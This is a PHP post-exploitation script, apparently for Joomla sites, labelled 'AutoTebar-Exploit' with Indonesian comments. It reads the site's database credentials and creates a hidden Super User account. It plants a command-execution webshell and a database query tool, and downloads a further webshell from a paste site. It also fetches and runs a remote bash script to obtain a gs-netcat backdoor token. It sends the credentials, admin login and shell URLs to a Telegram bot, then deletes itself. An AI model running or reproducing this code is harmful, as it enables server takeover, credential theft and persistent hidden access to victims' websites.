    <?php

    error_reporting(0);
    ini_set('display_errors', 0);
    set_time_limit(0);
    ignore_user_abort(true);
    @ob_start();


    register_shutdown_function(function() {
        @ob_end_flush();
        @unlink(__FILE__);
    });

    $BOT_TOKEN = "biji";
    $CHAT_ID   = "8600700974";


    function send_tg($msg) {
        global $BOT_TOKEN, $CHAT_ID;
        $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?chat_id={$CHAT_ID}&text=" . urlencode($msg);
        
        $result = @file_get_contents($url);
        if ($result === false) {
            // Fallback dengan cURL
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 15,
                    CURLOPT_SSL_VERIFYPEER => false
                ]);
                $result = curl_exec($ch);
                curl_close($ch);
            }
        }
        return $result;
    }

    function generateRandomPassword($length = 12) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $password = '';
        for ($i = 0; $i < $length; $i++) {
            $password .= $chars[random_int(0, strlen($chars) - 1)];
        }
        return $password;
    }

    echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
    echo "╔══════════════════════════════════════════════════════════════════╗\n";
    echo "║   🔥 AutoTebar-Exploit - CVE-2026-48907 (Fixed) 🔥             ║\n";
    echo "║   Time: " . date('Y-m-d H:i:s') . "                              ║\n";
    echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
    @ob_flush(); flush();


    $base = realpath(__DIR__ . '/../..');
    if ($base === false) {
        die("[-] Gagal mendapatkan base path!\n");
    }
    echo "[+] Base directory: $base\n";
    @ob_flush(); flush();

    // =========================================================================
    // CARI CONFIGURATION.PHP di base path
    // =========================================================================
    $config_file = $base . '/configuration.php';
    if (!file_exists($config_file)) {
        die("[-] configuration.php tidak ditemukan di $config_file\n");
    }
    echo "[+] Config file: $config_file\n";
    @ob_flush(); flush();

    // Pindah ke base directory agar semua path relatif bekerja
    chdir($base);

    include $config_file;
    $c = new JConfig();

    // Koneksi DB
    $db = new mysqli($c->host, $c->user, $c->password, $c->db);
    if ($db->connect_error) {
        die("[-] DB Error: " . $db->connect_error . "\n");
    }
    echo "[+] DB Connected\n\n";
    @ob_flush(); flush();

    // =========================================================================
    // CARI TABEL USERS YANG BENAR
    // =========================================================================
    $tables = $db->query("SHOW TABLES");
    $all_tables = [];
    while ($row = $tables->fetch_array()) {
        $all_tables[] = $row[0];
    }

    $users_table = null;
    $prefix = '';

    foreach ($all_tables as $table) {
        if (preg_match('/^([a-zA-Z0-9_]+)users$/', $table, $matches)) {
            $check = $db->query("DESCRIBE $table");
            $has_username = false;
            $has_password = false;
            while ($col = $check->fetch_assoc()) {
                if ($col['Field'] == 'username') $has_username = true;
                if ($col['Field'] == 'password') $has_password = true;
            }
            if ($has_username && $has_password) {
                $users_table = $table;
                $prefix = $matches[1];
                echo "[+] ✅ Found Joomla users table: $table\n";
                echo "[+] ✅ Prefix: $prefix\n";
                break;
            }
        }
    }

    if (!$users_table) {
        die("[-] Users table not found!\n");
    }

    // =========================================================================
    // CEK STRUKTUR TABEL USERS
    // =========================================================================
    $columns = $db->query("DESCRIBE $users_table");
    $col_names = [];
    while ($col = $columns->fetch_assoc()) {
        $col_names[] = $col['Field'];
    }

    // =========================================================================
    // BUAT / UPDATE USER ADMIN DENGAN PASSWORD RANDOM
    // =========================================================================
    echo "\n[*] Membuat user admin Joomla dengan password random...\n";
    @ob_flush(); flush();

    $ADMIN_USER = 'admin_article';
    $ADMIN_PASS = generateRandomPassword(12);
    $now = date('Y-m-d H:i:s');

    if (function_exists('password_hash')) {
        $hash = password_hash($ADMIN_PASS, PASSWORD_BCRYPT);
    } else {
        $hash = md5($ADMIN_PASS);
    }

    $check = $db->query("SELECT id FROM $users_table WHERE username = '$ADMIN_USER'");
    if ($check && $check->num_rows > 0) {
        $row = $check->fetch_assoc();
        $user_id = $row['id'];
        echo "[!] User already exists! ID: $user_id\n";
        
        // Update password
        $upd = $db->query("UPDATE $users_table SET password = '$hash' WHERE id = $user_id");
        if ($upd) {
            echo "[+] ✅ Password updated successfully for user ID: $user_id\n";
            $ADMIN_STATUS = "UPDATED";
        } else {
            echo "[-] Failed to update password: " . $db->error . "\n";
            $ADMIN_STATUS = "UPDATE_FAILED";
        }
    } else {
        // Buat user baru
        $fields = [];
        $values = [];
        
        if (in_array('name', $col_names)) { $fields[] = 'name'; $values[] = "'Administrator'"; }
        if (in_array('username', $col_names)) { $fields[] = 'username'; $values[] = "'$ADMIN_USER'"; }
        if (in_array('email', $col_names)) { $fields[] = 'email'; $values[] = "'admin@$ADMIN_USER'"; }
        if (in_array('password', $col_names)) { $fields[] = 'password'; $values[] = "'$hash'"; }
        if (in_array('block', $col_names)) { $fields[] = 'block'; $values[] = "0"; }
        if (in_array('sendEmail', $col_names)) { $fields[] = 'sendEmail'; $values[] = "0"; }
        if (in_array('registerDate', $col_names)) { $fields[] = 'registerDate'; $values[] = "'$now'"; }
        if (in_array('lastvisitDate', $col_names)) { $fields[] = 'lastvisitDate'; $values[] = "'$now'"; }
        if (in_array('activation', $col_names)) { $fields[] = 'activation'; $values[] = "''"; }
        if (in_array('params', $col_names)) { $fields[] = 'params'; $values[] = "'{}'"; }
        
        $sql = "INSERT INTO $users_table (" . implode(',', $fields) . ") VALUES (" . implode(',', $values) . ")";
        if ($db->query($sql)) {
            $user_id = $db->insert_id;
            echo "[+] ✅ User created! ID: $user_id\n";
            $ADMIN_STATUS = "CREATED";
        } else {
            echo "[-] Insert failed: " . $db->error . "\n";
            $ADMIN_STATUS = "FAILED";
        }
    }

    // Set Super User (gunakan INSERT IGNORE agar tahan duplikat)
    if (isset($user_id) && $user_id) {
        $map_table = $prefix . "user_usergroup_map";
        if (in_array($map_table, $all_tables)) {
            $db->query("INSERT IGNORE INTO $map_table (user_id, group_id) VALUES ($user_id, 8)");
            if ($db->affected_rows > 0) {
                echo "[+] ✅ Set as Super User\n";
            } else {
                echo "[+] Super User already set (or ignored)\n";
            }
        } else {
            echo "[!] Map table $map_table not found\n";
        }
    } else {
        echo "[-] No valid user_id, cannot set Super User\n";
    }
    @ob_flush(); flush();

    $db->close();

    // =========================================================================
    // DOMAIN
    // =========================================================================
    $DOMAIN = $c->live_site ?? '';
    if (empty($DOMAIN)) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $DOMAIN = $protocol . '://' . $_SERVER['HTTP_HOST'];
    }
    $DOMAIN = rtrim($DOMAIN, '/');
    echo "[+] Domain: $DOMAIN\n";
    @ob_flush(); flush();

    // =========================================================================
    // LOCK FOLDER: images
    // =========================================================================
    echo "\n[*] Mengunci folder images (PHP files return 404)...\n";
    $images_dir = $base . '/images';
    if (!is_dir($images_dir)) {
        @mkdir($images_dir, 0755, true);
    }

    $LOCK_STATUS = "FAILED";
    if (is_dir($images_dir) && is_writable($images_dir)) {
        $htaccess = '<FilesMatch "^\.ht">
        Require all denied
    </FilesMatch>

    <FilesMatch "\.(php|phtml|php[3-8]|phps|phar|pht|shtml)$">
        Require all denied
    </FilesMatch>

    <IfModule mod_php.c>
        php_flag engine off
    </IfModule>

    Options -Indexes
    ';
        
        if (@file_put_contents($images_dir . '/.htaccess', $htaccess)) {
            echo "[+] ✅ .htaccess created in $images_dir\n";
            echo "[+]    - PHP files: 404 Not Found\n";
            echo "[+]    - Images: tetap bisa diakses\n";
            $LOCK_STATUS = "ACTIVE";
        } else {
            echo "[-] Cannot write .htaccess to $images_dir\n";
        }
    } else {
        echo "[-] Cannot write to $images_dir\n";
    }
    @ob_flush(); flush();

    // =========================================================================
    // CARI FOLDER UNTUK WEBSHELL
    // =========================================================================
    echo "\n[*] Mencari folder untuk WebShell...\n";
    $safe_dirs = ['media', 'components', 'modules', 'templates', 'cache', 'administrator/cache'];
    $found_dir = '';

    foreach ($safe_dirs as $dir) {
        $full_dir = $base . '/' . $dir;
        if (!is_dir($full_dir)) @mkdir($full_dir, 0755, true);
        if (is_dir($full_dir) && is_writable($full_dir)) {
            $found_dir = $full_dir;
            echo "[+] Using directory: $full_dir\n";
            break;
        }
    }

    if (empty($found_dir)) {
        $found_dir = $base;
        echo "[!] Using base directory\n";
    }
    @ob_flush(); flush();

    // =========================================================================
    // BUAT WEBSHELL DI FOLDER AMAN
    // =========================================================================
    $rand1 = substr(md5(mt_rand()), 0, 12);
    $shell_file = $found_dir . "/{$rand1}.php";
    $shell_content = '<?php 
        if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}
        elseif(isset($_REQUEST["c"])){system($_REQUEST["c"]);}
        else{echo "OK";}
        ?>';

    if (@file_put_contents($shell_file, $shell_content)) {
        @chmod($shell_file, 0644);
        $shell_rel = str_replace($base, '', $shell_file);
        $shell_url = $DOMAIN . $shell_rel;
        echo "[+] WebShell: $shell_url?cmd=id\n";
    } else {
        $shell_url = "FAILED";
        echo "[-] Gagal membuat webshell\n";
    }
    @ob_flush(); flush();

    // =========================================================================
    // BUAT ADMINER (coba official, fallback lite)
    // =========================================================================
    $rand2 = substr(md5(mt_rand()), 0, 12);
    $adminer_file = $found_dir . "/{$rand2}.php";
    $adminer_url_full = "FAILED";

    $ctx = stream_context_create(['http' => ['timeout' => 10]]);
    $adminer_content = @file_get_contents("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql.php", false, $ctx);
    if ($adminer_content && strlen($adminer_content) > 10000) {
        if (@file_put_contents($adminer_file, $adminer_content)) {
            @chmod($adminer_file, 0644);
            echo "[+] ✅ Adminer official\n";
            $adminer_url_full = $DOMAIN . str_replace($base, '', $adminer_file);
        }
    }

    if ($adminer_url_full === "FAILED") {
        $fallback = '<?php
        $server = $_REQUEST["server"] ?? "localhost";
        $username = $_REQUEST["username"] ?? "";
        $password = $_REQUEST["password"] ?? "";
        $database = $_REQUEST["database"] ?? "";
        $query = $_REQUEST["query"] ?? "";
        if($username && $database && $query){
            $conn = new mysqli($server, $username, $password, $database);
            if(!$conn->connect_error && $result = $conn->query($query)){
                echo "<pre>";
                while($row = $result->fetch_assoc()) print_r($row);
                echo "</pre>";
            }
            $conn->close();
        }
        echo "<h2>Adminer Lite</h2>
        <form method=get>
        Server: <input name=server value=localhost><br>
        Username: <input name=username><br>
        Password: <input name=password type=password><br>
        Database: <input name=database><br>
        Query: <textarea name=query rows=5 cols=50></textarea><br>
        <input type=submit value=Execute>
        </form>";
        ';
        if (@file_put_contents($adminer_file, $fallback)) {
            @chmod($adminer_file, 0644);
            $adminer_url_full = $DOMAIN . str_replace($base, '', $adminer_file);
            echo "[+] ⚠️ Adminer fallback created\n";
        } else {
            echo "[-] Gagal membuat Adminer fallback\n";
        }
    }
    echo "[+] Adminer: $adminer_url_full\n";
    @ob_flush(); flush();

    // =========================================================================
    // TAMBAHAN: WEBSHELL DARI PASTE.MANGSUD.ORG
    // =========================================================================
    echo "\n[*] Menambahkan webshell dari paste.mangsud.org...\n";
    $new_shell_dir = $base . '/administrator/manifests/libraries';
    if (!is_dir($new_shell_dir)) {
        @mkdir($new_shell_dir, 0755, true);
    }

    $NEW_SHELL_URL = "FAILED";
    if (is_dir($new_shell_dir) && is_writable($new_shell_dir)) {
        $shell_content = @file_get_contents('https://paste.mangsud.org/raw/db85f35e', false, $ctx);
        if ($shell_content === false && function_exists('curl_init')) {
            // Fallback curl
            $ch = curl_init('https://paste.mangsud.org/raw/db85f35e');
            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_SSL_VERIFYPEER => false]);
            $shell_content = curl_exec($ch);
            curl_close($ch);
        }
        if ($shell_content && strlen($shell_content) > 100) {
            $new_shell_name = 'sys_' . substr(md5(mt_rand()), 0, 8) . '.php';
            $new_shell_path = $new_shell_dir . '/' . $new_shell_name;
            if (@file_put_contents($new_shell_path, $shell_content)) {
                @chmod($new_shell_path, 0644);
                $new_shell_rel = str_replace($base, '', $new_shell_path);
                $NEW_SHELL_URL = $DOMAIN . $new_shell_rel;
                echo "[+] ✅ Extra WebShell: $NEW_SHELL_URL\n";
            } else {
                echo "[-] Gagal menyimpan webshell tambahan\n";
            }
        } else {
            echo "[-] Gagal download webshell\n";
        }
    } else {
        echo "[-] Directory tidak bisa ditulis\n";
    }
    @ob_flush(); flush();

    // =========================================================================
    // EKSEKUSI COMMAND: curl dan bash deploy-all.sh
    // =========================================================================
    echo "\n[*] Menjalankan perintah deploy...\n";
    @ob_flush(); flush();

    // Command 1: curl
    $ret1 = null;
    system("curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh 2>&1", $ret1);
    echo "[+] Curl deploy-all.sh returned: " . ($ret1 ?? 'unknown') . "\n";

    // Command 2: bash
    $output = shell_exec("bash deploy-all.sh 2>&1");
    if ($output === null) {
        $output = "No output from deploy script";
    }
    echo "[+] Output (first 500 chars):\n" . substr($output, 0, 500) . "\n";

    // Ekstrak token
    $gs_token = "NOT FOUND";
    if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"\s+-i/', $output, $matches)) {
        $gs_token = $matches[1];
    }
    echo "[+] gs-netcat token: $gs_token\n";
    @ob_flush(); flush();

    // =========================================================================
    // PROTECT WEBSHELL FOLDER
    // =========================================================================
    $htaccess_protect = "Options -Indexes\n<FilesMatch \"\.(php|inc)$\">\n    Require all granted\n</FilesMatch>";
    @file_put_contents($found_dir . "/.htaccess", $htaccess_protect);
    echo "[+] Protected directory\n";
    @ob_flush(); flush();

    // =========================================================================
    // KIRIM LAPORAN TELEGRAM
    // =========================================================================
    $REPORT = "🔥 AutoTebar-Exploit - CVE-2026-48907 🔥\n\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
    $REPORT .= "🌐 Domain: $DOMAIN\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

    $REPORT .= "🗄️ DATABASE CONFIGURATION\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "Host     : " . ($c->host ?? '?') . "\n";
    $REPORT .= "Database : " . ($c->db ?? '?') . "\n";
    $REPORT .= "Username : " . ($c->user ?? '?') . "\n";
    $REPORT .= "Password : " . ($c->password ?? '?') . "\n";
    $REPORT .= "Prefix   : $prefix\n\n";

    $REPORT .= "👑 JOOMLA ADMIN LOGIN\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "URL      : $DOMAIN/administrator\n";
    $REPORT .= "Username : $ADMIN_USER\n";
    $REPORT .= "Password : $ADMIN_PASS\n";
    $REPORT .= "Status   : " . ($ADMIN_STATUS ?? 'UNKNOWN') . "\n\n";

    $REPORT .= "🕸️ WEBSHELL ACCESS\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "Shell    : " . ($shell_url ?? 'FAILED') . "\n";
    $REPORT .= "Adminer  : " . ($adminer_url_full ?? 'FAILED') . "\n";
    $REPORT .= "Extra    : $NEW_SHELL_URL\n\n";

    $REPORT .= "🔒 LOCKED FOLDER\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "Path     : $images_dir\n";
    $REPORT .= "Status   : $LOCK_STATUS\n\n";

    $REPORT .= "🔧 GS-NETCAT TOKEN\n";
    $REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $REPORT .= "Token    : $gs_token\n";

    $tg_result = send_tg($REPORT);
    if ($tg_result !== false) {
        echo "[+] Laporan dikirim ke Telegram\n";
    } else {
        echo "[-] Gagal mengirim laporan ke Telegram\n";
    }

    // =========================================================================
    // OUTPUT FINAL
    // =========================================================================
    echo "\n";
    echo "═══════════════════════════════════════════════════════════════════\n";
    echo "                     🎉 AutoTebar-Exploit COMPLETED 🎉\n";
    echo "═══════════════════════════════════════════════════════════════════\n";
    echo "\n";
    echo "🌐 Admin URL    : $DOMAIN/administrator\n";
    echo "👤 Username     : $ADMIN_USER\n";
    echo "🔐 Password     : $ADMIN_PASS\n";
    echo "🕸️ WebShell     : " . ($shell_url ?? 'Gagal') . "\n";
    echo "🕸️ Adminer      : " . ($adminer_url_full ?? 'Gagal') . "\n";
    echo "🕸️ Extra Shell  : $NEW_SHELL_URL\n";
    echo "🔒 Locked folder: $images_dir\n";
    echo "🔧 Token        : $gs_token\n";
    echo "\n";
    echo "✅ Selesai! Cek Telegram untuk laporan lengkap.\n";
    echo "⚠️  File exploit ini akan terhapus otomatis.\n";
    echo "</pre>";

    @ob_end_flush();
    ?>
